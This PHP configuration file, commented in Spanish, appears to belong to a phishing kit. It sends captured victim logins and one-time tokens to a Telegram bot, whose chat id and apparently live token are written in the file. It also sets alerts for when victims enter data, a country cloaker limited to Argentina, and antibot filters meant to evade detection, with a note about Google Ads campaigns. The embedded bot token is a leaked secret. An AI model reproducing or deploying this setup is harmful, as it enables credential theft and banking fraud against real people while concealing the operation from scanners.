<?php
/**

**/

	//	Telegram
	$id = '5912426104';    // chat id      
	$key = '7108653539:AAEdExO7gG8QPI3WD3bBvlxnyP8KFdaOIY8'; // token
	$tg = true;
	
	// Txt
	$txt = false; // true para que ponga los resultados en un archivo .html/txt | false para desactivar
	$txtn = "darling"; // .html nombre del archivo donde cae los resultados
	$timezone = "America/Caracas"; // Zona horaria para la fecha que se pondra al momento de ingresar resultados

	// Dynamic Config
	$dual_login = true; // true para activar dual login | false para desactivar
	$alert = true; // true para activar la alerta de cliente ingresando | false para desactivar
	$alertx = true; // true para activar aviso de cliente ingresando token | false para desactivar
	$timer = "15"; // segundos que demorara el reloj para mostrar la sgte pagina
	$out = "../pay.html";	// Página final de redirección

	// CLOACKER CONFIG
	$comprobate_country = true;		// true para activar el cloacker | false para desactivar
	$countries_allowed = ["AR"];	//	pais permitido para el cloacker
	
	
	//	Antiflood System 
	$blocker = true;		// true para activar autoblocker | false para desactivar
	
		
	//	ANTIBOTS EYEZGUARD v1.3
	$EYEZ = 0;		// 1 para activar antibots | NO SE RECOMIENDA USAR ANTIBOTS EN CAMPAÑAS DE GOOGLE ADS
	//	para ver, activar o desactivar algún escudo del guardian revisar en su config ./guardian/config,ini
	/**
	 * 	// Default EYEZGUARD config - 'on' encendido | 'off' apagado
	anti_ua='on'			// ANTI USER AGENT
	anti_hn='on'    		// ANTI HOSTNAME
	anti_isp='on'			// ANTI ISP
	anti_fingerprints='off'	// ANTI FINGERPRINTS
	anti_proxy='off'		// ANTI PROXY
	 * 
	 */

?>